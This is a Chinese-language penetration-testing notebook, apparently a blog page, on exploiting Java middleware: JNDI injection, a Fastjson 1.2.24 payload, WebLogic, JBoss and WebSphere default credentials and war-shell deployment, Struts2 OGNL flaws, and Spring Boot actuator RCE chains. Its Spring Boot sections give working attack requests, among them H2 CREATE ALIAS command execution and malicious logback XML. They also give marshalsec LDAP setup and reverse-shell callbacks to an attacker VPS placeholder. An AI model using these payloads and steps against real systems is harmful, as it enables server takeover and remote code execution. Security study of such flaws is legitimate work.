+<h4 id="JNDI利用方式"><a href="#JNDI利用方式" class="headerlink" title="JNDI利用方式"></a>JNDI利用方式</h4><p>1、准备提供rmi或ldap的程序，再准备一个恶意类</p>
+<p>2、创建一个Reference对象,当一个对象不能直接存储在目录中时,就可以用使用Reference对象,这是JNDI中定义的一个类,用于描述对象的相关信息,例如类名,对象路径,class文件名,具体存储位置等信息。在Reference对象中描述恶意类的类名,class文件名,存储的地址等信息。</p>
+<p>3、启动LDAP&#x2F;RMI服务将Reference绑定到一个名称上。</p>
+<p>4、在存在JNDI注入的地方访问搭建的ldap或rmi服务查询指定的名称。此时目录服务会返回Reference对象,如果返回的对象是javax.naming.Reference类型的对象的话,JNDI会解析“classFactory”和“classFactoryLocation”属性,如果本地类路径存在该类就会在本地加载,如果本地不存在就会从classFactoryLocation中进行加载,classFactoryLocation通常是该类存储的地址,通常是一个http连接,此时会触发java的URLClassLoader类远程加载器,该加载器会获取远程类的字节码并将其加载到JVM中,此时恶意类的static代码块就会被执行,从而达到任意代码执行的目的。</p>
+<h3 id="漏洞原理-5"><a href="#漏洞原理-5" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>因为fastjson遵循Java bean的规范，所以它实现了private和setter，因为成员是私有的，所以其必定调用setter来给类成员赋值，而反序列化过程中需要使用到反射机制来创建对象调用的方法，漏洞触发点就在setter赋值那一步。</p>
+<h4 id="autotype"><a href="#autotype" class="headerlink" title="autotype"></a>autotype</h4><p>如果每次反序列化都要需要传递Class字节码对象，代码就会变得不灵活，所以FastJson引入了AutoType机制。</p>
+<p>FastJson的AutoType机制支持在反序列化的过程中自动获取指定类的Class文件对象，当序列化的JSON字符串中包含@type键时就会自动将其值作为反序列化生成对象的具体类型，FastJson自动获取对应的Class字节码对象，从而进行反射创建实例,为对象属性赋值等操作(和正常情况一样)，唯一的区别是不用直接传递class对象了，在JSON字符串中使用@type健即可自动获取类对应的Class对象。</p>
+<p>在使用toJSONString方法进行序列化操作时,传入SerializerFeature.WriteClassName即可使输出的格式化字符串携带@type键。</p>
+<h4 id="利用方式-2"><a href="#利用方式-2" class="headerlink" title="利用方式"></a>利用方式</h4><p>FastJson1.2.24版本反序列化漏洞Payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap/rmi Server&quot;, &quot;autoCommit&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p>AutoType在反序列化的过程中会自动获取@type键对应值的Java类的字节码对象。com.sun.rowset.JdbcRowSetImpl是一个Java的原生类,在反序列化的过程中如果@type的值是com.sun.rowset.JdbcRowSetImpl那么就会自动获取该类的Class字节码对象进行反射创建对象等操作,在该payload中对反序列化后对象的dataSourceName,autoCommit等属性值进行了设置,因此会调用这两个属性的setter方法。</p>
+<p>FastJson在设置多个属性值时调用setter方法的顺序是按照JSON字符串中属性的先后次序进行调用的。在payload中,会先调用dataSourceName的setter方法对其值进行设置,利用过程中dataSourceName的值通常会被设置为一个ldap或者rmi服务的地址。</p>
+<p>重点在AutoCommit属性的setter方法中,这个方法中调用了connect方法。在connect方法中调用了JNDI中的lookup函数,并且将getDataSourceName函数的值传入了lookup函数,按照JSON的先后顺序,DataSourceName属性值已被设置为了恶意ldap&#x2F;rmi服务的地址,所以传入lookup函数的参数是外部可控的,最终达到了JNDI注入的目的。</p>
+<h4 id="触发链"><a href="#触发链" class="headerlink" title="触发链"></a>触发链</h4><p>fastjson autotype 获取类的class对象–&gt;根据json字符串属性的先后顺序通过反射调用对应设置的setter方法为属性赋值–&gt;调用setDataSourceName设置将值设置为ldap&#x2F;rmi服务器的地址–&gt;调用setAutoCommit–&gt;在setAutoCommit方法中会调用connect方法–&gt;connect 方法会调用getDataSourceName方法已经设置的值ldap服务器的地址，将返回值传入lookup函数，lookup函数的参数可控，最终达到jndi注入的目的。</p>
+<h2 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h2><h3 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h3><p>7001 端口</p>
+<p>&#x2F;console</p>
+<p>From RFC xxx Hypertext</p>
+<h3 id="弱口令-war包部署"><a href="#弱口令-war包部署" class="headerlink" title="弱口令+war包部署"></a>弱口令+war包部署</h3><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>存在弱口令weblogic&#x2F;Oracle@123</p>
+<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><p>1、利用弱口令进入</p>
+<p>2、打包当前文件夹下的shell.jsp为 shell.war</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar -cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure>
+
+<p>3、上传部署应用</p>
+<h3 id="XMLDecoder反序列化漏洞"><a href="#XMLDecoder反序列化漏洞" class="headerlink" title="XMLDecoder反序列化漏洞"></a>XMLDecoder反序列化漏洞</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>在&#x2F;wls-wsat&#x2F;CoordinatorPortType（POST）处构造SOAP（XML）格式的请求，work:WorkContext 标签包裹的数据作为xmldecoder类实例化的参数，在解析的过程中导致XMLDecoder反序列化漏洞。</p>
+<h4 id="绕过-1"><a href="#绕过-1" class="headerlink" title="绕过"></a>绕过</h4><p>推出了个补丁，但可以绕过，绕过的方式是使用 object tag标签 </p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;string&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="WebLogic-T3协议反序列化命令执行漏洞"><a href="#WebLogic-T3协议反序列化命令执行漏洞" class="headerlink" title="WebLogic T3协议反序列化命令执行漏洞"></a>WebLogic T3协议反序列化命令执行漏洞</h3><h4 id="漏洞原理-6"><a href="#漏洞原理-6" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>在InboundMsgAbbrev中resolveProxyClass中，resolveProxyClass是处理rmi接口类型的，只判断了java.rmi.registry.Registry存在，这就会导致任意一个rmi接口都可绕过。核心部分就是JRMP（Java Remote Method protocol），在这个PoC中会序列化一个RemoteObjectInvocationHandler，它会利用UnicastRef建立到远端的tcp连接获取RMI registry，加载回来再利用readObject解析，从而造成反序列化远程代码执行。</p>
+<p>即weblogic server 会反序列化攻击发送的t3协议的请求，如果该请求中包含恶意的java反序列化对象，在反序列化过程中，触发远程代码执行。</p>
+<h3 id="WebLogic-未授权访问漏洞"><a href="#WebLogic-未授权访问漏洞" class="headerlink" title="WebLogic 未授权访问漏洞"></a>WebLogic 未授权访问漏洞</h3><h4 id="漏洞原理-7"><a href="#漏洞原理-7" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>WebLogic 未授权访问漏洞(CVE-2018-2894)，存在两个未授权的页面，可以上传任意文件，但是这两个页面只在开发环境下存在，分别为 config.do 和 begin.do。</p>
+<h4 id="利用过程-1"><a href="#利用过程-1" class="headerlink" title="利用过程"></a>利用过程</h4><p>首先进入<code>config.do</code>文件进行设置，将目录设置为<code>ws_utc</code>应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。</p>
+<p>点击添加后上传一个jsp。</p>
+<p>提交之后点击F12审查元素得到jsp上传后的时间戳。</p>
+<p>构造得到<a href="http://xxx:7001/ws_utc/css/config/keystore/1626765378314_shell.jsp%EF%BC%8C%E8%BF%9E%E6%8E%A5%E5%8D%B3%E5%8F%AF">http://xxx:7001/ws_utc/css/config/keystore/1626765378314_shell.jsp，连接即可</a></p>
+<p>begin.do:</p>
+<p>访问<a href="http://192.168.1.10:7001/ws_utc/begin.do%EF%BC%8C%E4%B8%8A%E4%BC%A0%E4%B8%80%E4%B8%AAjsp">http://192.168.1.10:7001/ws_utc/begin.do，上传一个jsp</a></p>
+<p>上传的文件的路径就在返回包中</p>
+<h3 id="Weblogic-Console-HTTP协议远程代码执行漏洞"><a href="#Weblogic-Console-HTTP协议远程代码执行漏洞" class="headerlink" title="Weblogic Console HTTP协议远程代码执行漏洞"></a>Weblogic Console HTTP协议远程代码执行漏洞</h3><p>cve-2020-14882 通过访问console.portal 路径并且触发 handle 执行。</p>
+<h2 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h2><h3 id="特征-1"><a href="#特征-1" class="headerlink" title="特征"></a>特征</h3><p>&#x2F;jmx-console</p>
+<h3 id="JBOSSApplication-Server反序列化命令执行漏洞"><a href="#JBOSSApplication-Server反序列化命令执行漏洞" class="headerlink" title="JBOSSApplication Server反序列化命令执行漏洞"></a>JBOSSApplication Server反序列化命令执行漏洞</h3><p>CVE-2017-12149，该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
+<h3 id="jboss控制台未授权访问"><a href="#jboss控制台未授权访问" class="headerlink" title="jboss控制台未授权访问"></a>jboss控制台未授权访问</h3><p>进入控制台后，找到<code>flavor</code>字符串，这一行就是jboss远程部署war包所在的位置</p>
+<p>点进去之后找到addURL()这个位置，上传shell.war文件</p>
+<p>再回到addURL()的地方，输入war文件的地址，然后点击inmoke部署</p>
+<h3 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h3><p>jboss的6.x，admin&#x2F;admin</p>
+<p>可以在后台部署war包</p>
+<h2 id="websphere"><a href="#websphere" class="headerlink" title="websphere"></a>websphere</h2><h3 id="特征-2"><a href="#特征-2" class="headerlink" title="特征"></a>特征</h3><p>&#x2F;ibm&#x2F;console</p>
+<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>CVE-2015-7450</p>
+<p>由于使用Java InvokerTransformer类对数据进行反序列化，Apache Commons COllections可能允许远程攻击者在系统上执行任意代码。通过发送特制数据，攻击者可以利用此漏洞在系统上执行任意Java代码</p>
+<p>该反序列化漏洞发生的位置在SOAP的通信端口8880，使用https发送XML格式数据。如果访问8880端口出现如下界面，则可能存在Java反序列化漏洞</p>
+<h3 id="弱口令-1"><a href="#弱口令-1" class="headerlink" title="弱口令"></a>弱口令</h3><p>在6.x至7.0版本，后台登录只需要输入admin作为用户标识，无需密码，即可登录后台</p>
+<p>websphere&#x2F; websphere</p>
+<p>system&#x2F; manager</p>
+<p>然后上传war包getshell</p>
+<h2 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h2><h3 id="特征-3"><a href="#特征-3" class="headerlink" title="特征"></a>特征</h3><p>.action</p>
+<p>默认 User-Agent: Jakarta Commons-HttpClient&#x2F;3.1</p>
+<p>访问路径 &#x2F;struts-version</p>
+<h3 id="S2-001"><a href="#S2-001" class="headerlink" title="S2-001"></a>S2-001</h3><p>CVE-2007-4556，该漏洞因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行</p>
+<h3 id="s2-007"><a href="#s2-007" class="headerlink" title="s2-007"></a>s2-007</h3><p>当 <code>&lt;ActionName&gt; -validation.xml</code>配置的验证规则。如果类型验证转换失败，则服务器将拼接用户提交的表单值字符串，然后执行OGNL表达式解析并返回，造成OGNL表达式注入。从而可能造成远程执行代码。</p>
+<p>当用户 age 以str而不是的形式提交时 int，服务器将拼接 “‘“ + value + “‘“ 代码，然后使用OGNL表达式对其进行解析。为了成功完成任务，我们需要找到一个配置有相似验证规则的表单字段，以产生转换错误。然后，您可以通过注入SQL单引号的方式注入任何OGNL表达式代码</p>
+<h3 id="s2-045"><a href="#s2-045" class="headerlink" title="s2-045"></a>s2-045</h3><p>这个漏洞是由于Strus2对错误消息处理出现了问题，通过Content-Type这个header头，注入OGNL语言，进而执行命令。攻击者可以将恶意代码通过http报文头部的Content-Type字段传递给存在漏洞的<a href="https://cloud.tencent.com/product/cvm?from=20067&from_column=20067">服务器</a>，导致任意代码执行漏洞，要想顺利触发德华，lib中一定要有commons-fileupload-x.x.x.jar包</p>
+<h3 id="s2-046"><a href="#s2-046" class="headerlink" title="s2-046"></a>s2-046</h3><p>该漏洞与S2-045触发点一样，但利用方式不同，使用恶意的Content-Disposition值或者使用不合适的Content-Length头就可能导致远程命令执行</p>
+<h2 id="springboot"><a href="#springboot" class="headerlink" title="springboot"></a>springboot</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/env、/refresh: spring cloud SnakeYAML RCE、eureka xstream deserialization RCE</span><br><span class="line">/jolokia：jolokia logback JNDI RCE、jolokia Realm JNDI RCE</span><br><span class="line"></span><br><span class="line">/env、/restart：restart h2 database query RCE、h2 database console JNDI RCE、mysql jdbc deserialization RCE、restart logging.config logback JNDI RCE、restart logging.config groovy RCE、restart spring.main.sources groovy RCE、restart spring.datasource.data h2 database RCE（都与数据库相关）</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="whitelabel-error-page-SpEL-RCE"><a href="#whitelabel-error-page-SpEL-RCE" class="headerlink" title="whitelabel error page SpEL RCE"></a>whitelabel error page SpEL RCE</h3><h4 id="漏洞原理-8"><a href="#漏洞原理-8" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol>
+<li>spring boot 处理参数值出错，流程进入 <code>org.springframework.util.PropertyPlaceholderHelper</code> 类中</li>
+<li>此时 URL 中的参数值会用 <code>parseStringValue</code> 方法进行递归解析</li>
+<li>其中 <code>$&#123;&#125;</code> 包围的内容都会被 <code>org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration</code> 类的 <code>resolvePlaceholder</code> 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞</li>
+</ol>
+<h4 id="利用条件-3"><a href="#利用条件-3" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0</li>
+<li>至少知道一个触发 springboot 默认错误页面的接口及参数名</li>
+</ul>
+<h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><p>1、找到正常传参处，页面报500状态码：whitelabel error page </p>
+<p>2、执行spel表达式 ${}</p>
+<p><code>/article?id=$&#123;7*7&#125;</code></p>
+<p>由字符串格式转换成 <code>0x**</code> java 字节形式，方便执行任意代码</p>
+<h3 id="spring-cloud-SnakeYAML-RCE"><a href="#spring-cloud-SnakeYAML-RCE" class="headerlink" title="spring cloud SnakeYAML RCE"></a>spring cloud SnakeYAML RCE</h3><h4 id="漏洞原理-9"><a href="#漏洞原理-9" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol>
+<li>spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址</li>
+<li>refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容</li>
+<li>SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作</li>
+<li>先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件</li>
+<li>然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化</li>
+<li>实例化类时执行恶意代码，造成 RCE 漏洞</li>
+</ol>
+<h4 id="利用条件-4"><a href="#利用条件-4" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标依赖的 <code>spring-cloud-starter</code> 版本 &lt; 1.3.0.RELEASE</li>
+<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h4><p>1、托管yml和jar文件</p>
+<p>2、通过&#x2F;env接口设置 spring.cloud.bootstrap.location 属性</p>
+<p>3、通过&#x2F;refresh接口刷新配置</p>
+<h3 id="eureka-xstream-deserialization-RCE"><a href="#eureka-xstream-deserialization-RCE" class="headerlink" title="eureka xstream deserialization RCE"></a>eureka xstream deserialization RCE</h3><h4 id="漏洞原理-10"><a href="#漏洞原理-10" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol>
+<li>eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址</li>
+<li>refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload</li>
+<li>目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞</li>
+</ol>
+<h4 id="利用条件-5"><a href="#利用条件-5" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标使用的 <code>eureka-client</code> &lt; 1.8.7（通常包含在 <code>spring-cloud-starter-netflix-eureka-client</code> 依赖中）</li>
+<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h4><p>1、架设恶意xstream payload 网站</p>
+<p>提供一个依赖 Flask 并符合要求的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/springboot-xstream-rce.py">python 脚本示例</a>，作用是利用目标 Linux 机器上自带的 python 来反弹shell。</p>
+<p>使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。</p>
+<p>2、监听反弹shell端口</p>
+<p>3、通过 &#x2F;env 接口设置eureka.client.serviceUrl.defaultZone属性</p>
+<p>4、通过 &#x2F;refresh 接口刷新配置</p>
+<h3 id="jolokia-logback-JNDI-RCE"><a href="#jolokia-logback-JNDI-RCE" class="headerlink" title="jolokia logback JNDI RCE"></a>jolokia logback JNDI RCE</h3><h4 id="漏洞原理-11"><a href="#漏洞原理-11" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol>
+<li>直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 类的 <code>reloadByURL</code> 方法</li>
+<li>目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容</li>
+<li>目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞)</li>
+<li>xml 文件中利用 <code>logback</code> 依赖的 <code>insertFormJNDI</code> 标签，设置了外部 JNDI 服务器地址</li>
+<li>目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞</li>
+</ol>
+<h4 id="利用条件-6"><a href="#利用条件-6" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li>
+<li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）并且环境中存在相关 MBean</li>
+<li>目标可以请求攻击者的 HTTP 服务器（请求可出外网）</li>
+<li>普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1(LDAP)，但相关环境可绕过</li>
+</ul>
+<h4 id="利用方法-3"><a href="#利用方法-3" class="headerlink" title="利用方法"></a>利用方法</h4><p>1、查看已存在的MBeans</p>
+<p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>ch.qos.logback.classic.jmx.JMXConfigurator</code> 和 <code>reloadByURL</code> 关键词</p>
+<p>2、托管xml文件在vps上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;configuration&gt;</span><br><span class="line">  &lt;insertFromJNDI env-entry-name=&quot;ldap://your-vps-ip:1389/JNDIObject&quot; as=&quot;appName&quot; /&gt;</span><br><span class="line">&lt;/configuration&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3、准备要执行的 Java 代码</p>
+<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>，</p>
+<p>使用兼容低版本 jdk 的方式编译：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -source 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure>
+
+<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+<p>4、架设恶意的ldap服务</p>
+<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br></pre></td></tr></table></figure>
+
+<p>5、监听反弹shell端口</p>
+<p>6、从外部url地址加载日志配置文件</p>
+<blockquote>
+<p>  ⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。</p>
+</blockquote>
+<p>替换实际的 your-vps-ip 地址访问 URL 触发漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/</span><br></pre></td></tr></table></figure>
+
+<h3 id="jolokia-Realm-JNDI-RCE"><a href="#jolokia-Realm-JNDI-RCE" class="headerlink" title="jolokia Realm JNDI RCE"></a>jolokia Realm JNDI RCE</h3><p>访问 <code>/jolokia/list</code> 接口，查看是否存在 <code>type=MBeanFactory</code> 和 <code>createJNDIRealm</code> 关键词。</p>
+<p>其他同上。</p>
+<h3 id="restart-h2-database-query-RCE"><a href="#restart-h2-database-query-RCE" class="headerlink" title="restart h2 database query RCE"></a>restart h2 database query RCE</h3><h4 id="漏洞原理-12"><a href="#漏洞原理-12" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol>
+<li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li>
+<li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li>
+<li>restart 重启应用，会建立新的数据库连接</li>
+<li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li>
+</ol>
+<h4 id="利用条件-7"><a href="#利用条件-7" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li>
+<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
+</ul>
+<h4 id="利用方法-4"><a href="#利用方法-4" class="headerlink" title="利用方法"></a>利用方法</h4><p>1、设置 spring.datasource.hikari.connection-test-query 属性</p>
+<blockquote>
+<p>  ⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p>
+</blockquote>
+<p>spring 1.x（无回显执行命令）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>spring 2.x（无回显执行命令）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>2、重启应用</p>
+<p>post请求访问 &#x2F;restart</p>
+<h3 id="h2-database-console-JNDI-RCE"><a href="#h2-database-console-JNDI-RCE" class="headerlink" title="h2 database console JNDI RCE"></a>h2 database console JNDI RCE</h3><h4 id="利用条件-8"><a href="#利用条件-8" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li>
+<li>spring 配置中启用 h2 console <code>spring.h2.console.enabled=true</code></li>
+<li>目标可以请求攻击者的服务器（请求可出外网）</li>
+<li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1（LDAP 方式）</li>
+</ul>
+<h4 id="利用方法-5"><a href="#利用方法-5" class="headerlink" title="利用方法"></a>利用方法</h4><p>1、访问路由获得 jsessionid</p>
+<p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p>
+<p>2、准备要执行的java代码</p>
+<p>编写优化过后的用来反弹 shell 的 <a href="https://raw.githubusercontent.com/LandGrey/SpringBootVulExploit/master/codebase/JNDIObject.java">Java 示例代码</a> <code>JNDIObject.java</code>，</p>
+<p>使用兼容低版本 jdk 的方式编译：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac -source 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure>
+
+<p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p>
+<p>3、托管class文件</p>
+<p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+
+<p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p>
+<p>4、架设ldap服务</p>
+<p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br></pre></td></tr></table></figure>
+
+<p>5、监听反弹shell</p>
+<p>6、发包触发jndi注入</p>
+<p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;u</span><br></pre></td></tr></table></figure>
+
+<h3 id="mysql-jdbc-deserialization-RCE"><a href="#mysql-jdbc-deserialization-RCE" class="headerlink" title="mysql jdbc deserialization RCE"></a>mysql jdbc deserialization RCE</h3><h4 id="漏洞原理-13"><a href="#漏洞原理-13" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><ol>
+<li>spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址</li>
+<li>refresh 刷新后设置了一个新的 spring.datasource.url 属性值</li>
+<li>当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接</li>
+<li>然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据</li>
+<li>目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞</li>
+</ol>
+<h4 id="利用条件-9"><a href="#利用条件-9" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
+<li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li>
+<li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li>
+<li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li>
+<li>目标可以请求攻击者的服务器（请求可出外网）</li>
+</ul>
+<h4 id="利用方法-6"><a href="#利用方法-6" class="headerlink" title="利用方法"></a>利用方法</h4><p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code> 关键词，并记录下其版本号（5.x 或 8.x）；</p>
